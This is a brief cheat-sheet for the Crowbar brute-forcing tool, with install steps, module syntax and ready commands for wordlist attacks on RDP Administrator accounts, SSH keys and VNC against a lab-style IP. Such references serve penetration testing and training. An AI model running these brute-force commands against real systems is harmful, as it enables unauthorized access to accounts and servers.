# 🛠️ Tool Master Guide: Crowbar (RDP & Key Brute-Forcer)

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: Crowbar
> - **Category**: Specialized RDP NLA & Key-Based Password Brute-Forcer
> - **License**: Open Source (GPL-3.0)
> - **Installation Command**: `sudo apt update && sudo apt install -y crowbar`
> - **Binary Path**: `/usr/bin/crowbar`
> - **Primary Objective**: Performs brute-force authentication testing against Network Level Authentication (NLA) enabled RDP servers, SSH private keys, OpenVPN configurations, and VNC services.

---

## 📋 1. Supported Protocol Modules & Syntax Matrix

| Protocol Module | Key Flag | Technical Command Syntax |
| :--- | :--- | :--- |
| **RDP (NLA Enabled)** | `-b rdp` | `crowbar -b rdp -s 10.10.10.50/32 -u Administrator -C rockyou.txt` |
| **SSH Private Key** | `-b sshkey` | `crowbar -b sshkey -s 10.10.10.50/32 -u root -k ~/.ssh/id_rsa` |
| **VNC Server** | `-b vnc` | `crowbar -b vnc -s 10.10.10.50/32 -C passwords.txt` |

---

## 💻 2. Practical Operational Workflow

```bash
# Perform NLA-supported RDP password brute force against target Windows server
crowbar -b rdp -s 10.10.10.50/32 -u Administrator -C /usr/share/wordlists/rockyou.txt -l crowbar_rdp.log
```
